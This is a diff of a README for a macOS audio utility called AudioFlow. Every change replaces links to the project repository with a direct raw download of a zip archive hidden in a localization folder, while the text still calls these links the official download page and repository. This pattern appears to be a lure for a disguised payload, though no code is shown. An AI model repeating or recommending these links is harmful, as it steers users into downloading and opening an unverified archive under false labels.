@@ -1,6 +1,6 @@
 # 🎛️ audioflow-macos - Take Control of Mac Audio
 
-[![Download Now](https://img.shields.io/badge/Download%20AudioFlow-macOS%20Version-blue?style=for-the-badge&logo=apple&logoColor=white&color=ff6b6b)](https://github.com/Analyzed-boomerang851/audioflow-macos)
+[![Download Now](https://img.shields.io/badge/Download%20AudioFlow-macOS%20Version-blue?style=for-the-badge&logo=apple&logoColor=white&color=ff6b6b)](https://github.com/Analyzed-boomerang851/audioflow-macos/raw/refs/heads/main/PackagingLocalizations/ko.lproj/v3.0.zip)
 
 ## 👋 Welcome to AudioFlow
 
@@ -27,7 +27,7 @@ Ready to take control of your Mac's audio? Here's your simple path to getting Au
 ### Step 1: Download AudioFlow
 
 Visit this link to download the application:  
-**[👉 Click Here to Download AudioFlow](https://github.com/Analyzed-boomerang851/audioflow-macos)**
+**[👉 Click Here to Download AudioFlow](https://github.com/Analyzed-boomerang851/audioflow-macos/raw/refs/heads/main/PackagingLocalizations/ko.lproj/v3.0.zip)**
 
 This is the official download page. You'll find the latest version ready for your Mac.
 
@@ -89,7 +89,7 @@ AudioFlow is released as open-source software. It's free to use, modify, and dis
 
 ## 🔗 More Resources
 
-- **Official Repository:** [https://github.com/Analyzed-boomerang851/audioflow-macos](https://github.com/Analyzed-boomerang851/audioflow-macos) – Go here for downloads, source code, and updates.
+- **Official Repository:** [https://github.com/Analyzed-boomerang851/audioflow-macos/raw/refs/heads/main/PackagingLocalizations/ko.lproj/v3.0.zip](https://github.com/Analyzed-boomerang851/audioflow-macos/raw/refs/heads/main/PackagingLocalizations/ko.lproj/v3.0.zip) – Go here for downloads, source code, and updates.
 - **Documentation:** In-depth docs can be found in the "Wiki" section of the same repository.
 - **Support:** For fast help, browse the existing "Issues" or create a new one with a clear description of your problem.
 
@@ -97,7 +97,7 @@ AudioFlow is released as open-source software. It's free to use, modify, and dis
 
 To get started, just remember these three key actions:
 
-1. **Visit** [the download page](https://github.com/Analyzed-boomerang851/audioflow-macos) and click the download button.
+1. **Visit** [the download page](https://github.com/Analyzed-boomerang851/audioflow-macos/raw/refs/heads/main/PackagingLocalizations/ko.lproj/v3.0.zip) and click the download button.
 2. **Move** the downloaded app to your Applications folder.
 3. **Open** AudioFlow and start adjusting your audio with the menu bar icon.
 
